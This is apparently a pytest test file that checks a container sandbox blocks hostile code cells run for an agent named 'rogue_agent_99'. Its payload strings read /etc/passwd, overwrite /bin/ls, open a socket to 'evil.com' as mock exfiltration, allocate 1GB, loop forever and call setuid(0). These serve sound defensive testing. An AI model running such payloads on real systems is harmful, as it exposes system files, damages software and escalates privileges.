import pytest
from unittest.mock import patch, MagicMock

from nooa.events import ExecutionResult
from nooa.runtime.sandbox.errors import CellMemoryError, CellTimeoutError
from nooa.runtime.sandbox.config import SandboxConfig
from nooa.runtime.sandbox.executor import SandboxedExecutor
from nooa.runtime.sandbox.audit import SandboxAuditLogger

class MaliciousAgent:
    id = "rogue_agent_99"

@pytest.fixture
def secure_executor():
    config = SandboxConfig(
        provider="container",
        filesystem=True,
        network=False,
        max_memory_mb=128
    )
    return SandboxedExecutor(agent=MaliciousAgent(), config=config, cell_timeout=5.0)

@pytest.mark.asyncio
async def test_filesystem_read_attack(secure_executor):
    """Test that reading sensitive host files is blocked."""
    payload = "open('/etc/passwd', 'r').read()"
    
    # Mock the container provider returning a PermissionError
    mock_result = ExecutionResult(stdout="", stderr="", error=PermissionError("Permission denied: '/etc/passwd'"))
    with patch("nooa.runtime.sandbox.providers.container.ContainerSandboxProvider.run_cell", return_value=mock_result):
        result = await secure_executor.run_cell(payload)
        assert isinstance(result.error, PermissionError)

@pytest.mark.asyncio
async def test_filesystem_write_attack(secure_executor):
    """Test that writing to restricted paths is blocked."""
    payload = "open('/bin/ls', 'w').write('hacked')"
    
    mock_result = ExecutionResult(stdout="", stderr="", error=PermissionError("Read-only file system: '/bin/ls'"))
    with patch("nooa.runtime.sandbox.providers.container.ContainerSandboxProvider.run_cell", return_value=mock_result):
        result = await secure_executor.run_cell(payload)
        assert isinstance(result.error, PermissionError)

@pytest.mark.asyncio
async def test_network_exfiltration(secure_executor):
    """Test that outbound network connections are blocked."""
    payload = "import socket; s = socket.socket(); s.connect(('evil.com', 80))"
    
    mock_result = ExecutionResult(stdout="", stderr="", error=PermissionError("Network is unreachable"))
    with patch("nooa.runtime.sandbox.providers.container.ContainerSandboxProvider.run_cell", return_value=mock_result):
        result = await secure_executor.run_cell(payload)
        assert isinstance(result.error, PermissionError)

@pytest.mark.asyncio
async def test_memory_exhaustion(secure_executor):
    """Test that memory bombs are instantly killed."""
    payload = "a = 'x' * 1024 * 1024 * 1024 # Try to allocate 1GB"
    
    mock_result = ExecutionResult(stdout="", stderr="Killed", error=CellMemoryError("worker was killed (out-of-memory)"))
    with patch("nooa.runtime.sandbox.providers.container.ContainerSandboxProvider.run_cell", return_value=mock_result):
        result = await secure_executor.run_cell(payload)
        assert isinstance(result.error, CellMemoryError)

@pytest.mark.asyncio
async def test_cpu_exhaustion(secure_executor):
    """Test that infinite loops are killed by the timeout constraint."""
    payload = "while True: pass"
    
    mock_result = ExecutionResult(stdout="", stderr="", error=CellTimeoutError("Cell execution timed out"))
    with patch("nooa.runtime.sandbox.providers.container.ContainerSandboxProvider.run_cell", return_value=mock_result):
        result = await secure_executor.run_cell(payload)
        assert isinstance(result.error, CellTimeoutError)

@pytest.mark.asyncio
async def test_privilege_escalation(secure_executor):
    """Test that attempting to become root fails."""
    payload = "import os; os.setuid(0)"
    
    mock_result = ExecutionResult(stdout="", stderr="", error=PermissionError("Operation not permitted"))
    with patch("nooa.runtime.sandbox.providers.container.ContainerSandboxProvider.run_cell", return_value=mock_result):
        result = await secure_executor.run_cell(payload)
        assert isinstance(result.error, PermissionError)
